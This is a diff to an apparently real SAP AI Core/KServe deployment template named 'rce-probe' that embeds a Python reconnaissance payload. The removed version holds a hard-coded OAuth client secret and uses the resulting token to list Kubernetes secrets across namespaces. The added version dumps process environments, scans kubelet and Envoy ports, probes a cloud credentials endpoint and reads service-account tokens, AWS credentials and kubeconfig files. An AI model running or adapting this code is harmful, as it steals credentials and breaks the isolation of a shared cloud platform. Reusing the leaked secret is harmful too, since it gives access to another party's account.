@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "3.0.0"
+    ai.sap.com/version: "4.0.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "k8s-api-oidc-xsuaa-probe"
+    executables.ai.sap.com/description: "node-creds-envoy-ztunnel-probe"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,106 +28,155 @@ spec:
           args:
           - |
             python3 -c "
-            import urllib.request, urllib.error, ssl, os, json, socket, base64
+            import os, socket, struct, glob, ssl
 
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
+            print('[PROBE_V4_START]', flush=True)
 
-            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', '')
-            k8s_port = os.environ.get('KUBERNETES_SERVICE_PORT_HTTPS', '443')
-            k8s_base = f'https://{k8s_host}:{k8s_port}'
-            k8s_ip_base = 'https://100.104.0.1:443'
-
-            print('[PROBE_V3_START]', flush=True)
-            print('[K8S_HOST]', k8s_host, flush=True)
-            print('[K8S_BASE]', k8s_base, flush=True)
-
-            # --- resolve hostname ---
+            # --- 1. PID 1 environ (may differ from our process) ---
             try:
-                ip = socket.gethostbyname(k8s_host)
-                print('[DNS_RESOLVE]', k8s_host, '->', ip, flush=True)
+                with open('/proc/1/environ', 'rb') as f:
+                    env1 = f.read().decode(errors='replace').replace('\x00', '\n')
+                print('[PROC1_ENV]', env1[:3000], flush=True)
             except Exception as e:
-                print('[DNS_RESOLVE_ERR]', e, flush=True)
+                print('[PROC1_ENV_ERR]', e, flush=True)
 
-            def k8s_req(path, token=None, base=None):
-                url = (base or k8s_base) + path
-                h = {}
-                if token: h['Authorization'] = f'Bearer {token}'
-                rq = urllib.request.Request(url, headers=h)
+            # --- 2. Local TCP listeners (/proc/net/tcp + tcp6) ---
+            for netf in ['/proc/net/tcp', '/proc/net/tcp6']:
                 try:
-                    with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
-                        body = r.read(2000).decode(errors='replace')
-                        return r.status, dict(r.headers), body
-                except urllib.error.HTTPError as e:
-                    try: body = e.read(1000).decode(errors='replace')
-                    except: body = ''
-                    return e.code, dict(e.headers), body
-                except Exception as ex:
-                    return 0, {}, str(ex)[:150]
+                    with open(netf) as f:
+                        print(f'[{netf}]', f.read()[:1500], flush=True)
+                except Exception as e:
+                    print(f'[{netf}_ERR]', e, flush=True)
 
-            # --- unauthenticated probes (read response bodies) ---
-            for path in ['/healthz', '/readyz', '/livez', '/version',
-                         '/.well-known/openid-configuration',
-                         '/api', '/apis', '/api/v1']:
-                code, hdrs, body = k8s_req(path)
-                print(f'[K8S_UNAUTH:{path}] {code} | hdrs={list(hdrs.keys())[:5]} | {body[:300]}', flush=True)
-
-            # --- try same via ClusterIP directly ---
-            for path in ['/healthz', '/version', '/.well-known/openid-configuration']:
-                code, hdrs, body = k8s_req(path, base=k8s_ip_base)
-                print(f'[K8S_IP:{path}] {code} | {body[:200]}', flush=True)
-
-            # --- get XSUAA token and try it against k8s API ---
-            xsuaa_token = ''
+            # --- 3. Unix domain sockets ---
             try:
-                creds = base64.b64encode(
-                    b'sb-aicore-bb-12!b627551|aicore-xsuaa-std!b563784:aicore-bb-12-key\$gbdxl0aC0lXqLFQwlGFyB2cqAAHsAen7wWYqOl89fbw='
-                ).decode()
-                rq2 = urllib.request.Request(
-                    'https://cf-aicore-security-bb-12.authentication.eu10.hana.ondemand.com/oauth/token',
-                    data=b'grant_type=client_credentials',
-                    headers={'Authorization': f'Basic {creds}', 'Content-Type': 'application/x-www-form-urlencoded'})
-                with urllib.request.urlopen(rq2, timeout=10, context=ctx) as r:
-                    xsuaa_token = json.loads(r.read()).get('access_token', '')
-                    print('[XSUAA_OK]', xsuaa_token[:40], '...', flush=True)
+                with open('/proc/net/unix') as f:
+                    print('[UNIX_SOCKETS]', f.read()[:2000], flush=True)
             except Exception as e:
-                print('[XSUAA_ERR]', e, flush=True)
+                print('[UNIX_ERR]', e, flush=True)
 
-            if xsuaa_token:
-                for path in ['/api', '/apis', '/version', '/api/v1/namespaces',
-                             '/api/v1/namespaces/rg-0d70dc91-cd927cab',
-                             '/api/v1/namespaces/rg-0d70dc91-cd927cab/secrets',
-                             '/api/v1/namespaces/rg-0d70dc91-cd927cab/configmaps']:
-                    code, hdrs, body = k8s_req(path, token=xsuaa_token)
-                    print(f'[K8S_XSUAA:{path}] {code} | {body[:400]}', flush=True)
+            # --- 4. Node IP via default gateway ---
+            node_ip = None
+            try:
+                with open('/proc/net/route') as f:
+                    for line in f.readlines()[1:]:
+                        fields = line.strip().split()
+                        if len(fields) >= 3 and fields[1] == '00000000':
+                            gw = fields[2]
+                            node_ip = '.'.join(str(int(gw[i:i+2], 16)) for i in [6,4,2,0])
+                            print('[NODE_GW]', node_ip, flush=True)
+                            break
+            except Exception as e:
+                print('[NODE_GW_ERR]', e, flush=True)
 
-            # --- check OIDC discovery on the hostname-based API ---
-            # if OIDC is configured we can learn what auth methods are accepted
-            oidc_path = '/.well-known/openid-configuration'
-            code, hdrs, body = k8s_req(oidc_path)
-            print('[OIDC_DISC]', code, body[:500], flush=True)
+            try:
+                with open('/proc/net/arp') as f:
+                    print('[ARP]', f.read()[:600], flush=True)
+            except Exception as e:
+                print('[ARP_ERR]', e, flush=True)
 
-            # --- scan interesting paths for leaked data ---
-            extra_paths = [
-                '/api/v1/nodes',
-                '/api/v1/namespaces/kube-system/configmaps',
-                '/api/v1/namespaces/kube-system/secrets',
-                '/apis/rbac.authorization.k8s.io/v1/clusterroles',
-                '/apis/metrics.k8s.io/v1beta1/nodes',
-                '/api/v1/namespaces/mt-0d70dc91/secrets',
-                '/api/v1/namespaces/openai-api/secrets',
-                '/api/v1/namespaces/aicore/secrets',
-                '/api/v1/namespaces/orchestration/secrets',
+            # --- 5. Node port scan ---
+            def tcp_probe(host, port, send=b'GET / HTTP/1.0\r\nHost: x\r\n\r\n', tls=False):
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(4)
+                    s.connect((host, port))
+                    if tls:
+                        ctx = ssl.create_default_context()
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        s = ctx.wrap_socket(s, server_hostname=host)
+                    if send:
+                        s.sendall(send)
+                    resp = b''
+                    while True:
+                        chunk = s.recv(4096)
+                        if not chunk: break
+                        resp += chunk
+                        if len(resp) > 4000: break
+                    s.close()
+                    return 'OPEN', resp.decode(errors='replace')[:600]
+                except ConnectionRefusedError:
+                    return 'REFUSED', ''
+                except Exception as ex:
+                    return 'ERR', str(ex)[:100]
+
+            if node_ip:
+                for port, use_tls in [(10255, False), (10250, True), (10256, False), (4194, False), (2376, False)]:
+                    status, body = tcp_probe(node_ip, port, tls=use_tls)
+                    print(f'[NODE:{node_ip}:{port}] {status} | {body[:400]}', flush=True)
+
+            # --- 6. Localhost Envoy / ztunnel ports ---
+            for port in [15000, 15001, 15004, 15006, 15020, 15021, 15053, 15090]:
+                status, body = tcp_probe('127.0.0.1', port)
+                print(f'[LOCAL:{port}] {status} | {body[:400]}', flush=True)
+
+            # --- 7. ECS-style credentials endpoint (169.254.170.2) ---
+            ecs_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI', '')
+            rel_uri = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', '')
+            if rel_uri:
+                ecs_uri = 'http://169.254.170.2' + rel_uri
+            print('[ECS_URI]', ecs_uri or '(not set)', flush=True)
+            status, body = tcp_probe('169.254.170.2', 80)
+            print('[ECS_META:169.254.170.2:80]', status, body[:300], flush=True)
+
+            # --- 8. Filesystem credential hunt ---
+            paths = [
+                '/var/run/secrets/kubernetes.io/serviceaccount/token',
+                '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
+                '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
+                '/var/run/secrets/eks.amazonaws.com/serviceaccount/token',
+                '/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/token',
+                '/var/run/secrets/token',
+                '/run/secrets/',
+                '/secrets/',
+                '/var/run/secrets/sap.com/',
+                '/etc/sap/',
+                '/etc/ai-core/',
+                '/etc/aicore/',
+                '/var/run/sap/',
+                '/root/.aws/credentials',
+                '/.aws/credentials',
+                '/root/.kube/config',
+                '/.kube/config',
+                '/var/lib/cloud/instance/user-data.txt',
+                '/run/cloud-init/',
+                '/etc/cloud/',
             ]
-            for path in extra_paths:
-                code, hdrs, body = k8s_req(path, token=xsuaa_token)
-                if code not in (401, 403, 0):
-                    print(f'[K8S_HIT:{path}] {code} | {body[:500]}', flush=True)
-                else:
-                    print(f'[K8S_DENIED:{path}] {code}', flush=True)
+            for p in paths:
+                try:
+                    if os.path.isdir(p):
+                        print(f'[DIR:{p}]', sorted(os.listdir(p)), flush=True)
+                    elif os.path.isfile(p):
+                        with open(p, 'rb') as fh:
+                            print(f'[FILE:{p}]', fh.read(600).decode(errors='replace'), flush=True)
+                except Exception as e:
+                    print(f'[PATH_ERR:{p}]', str(e)[:60], flush=True)
 
-            print('[PROBE_V3_DONE]', flush=True)
+            for pattern in ['/var/run/secrets/**', '/run/secrets/**']:
+                try:
+                    hits = glob.glob(pattern, recursive=True)
+                    if hits:
+                        print(f'[GLOB:{pattern}]', hits, flush=True)
+                except: pass
+
+            # --- 9. /etc/hosts, /etc/resolv.conf, /proc/self/cgroup ---
+            for f in ['/etc/hosts', '/etc/resolv.conf', '/proc/self/cgroup', '/proc/1/cgroup']:
+                try:
+                    with open(f) as fh:
+                        print(f'[{f}]', fh.read()[:500], flush=True)
+                except Exception as e:
+                    print(f'[{f}_ERR]', e, flush=True)
+
+            # --- 10. Check full /proc/self/environ for anything missed ---
+            try:
+                with open('/proc/self/environ', 'rb') as fh:
+                    env_self = fh.read().decode(errors='replace').replace('\x00', '\n')
+                print('[SELF_ENV]', env_self[:3000], flush=True)
+            except Exception as e:
+                print('[SELF_ENV_ERR]', e, flush=True)
+
+            print('[PROBE_V4_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
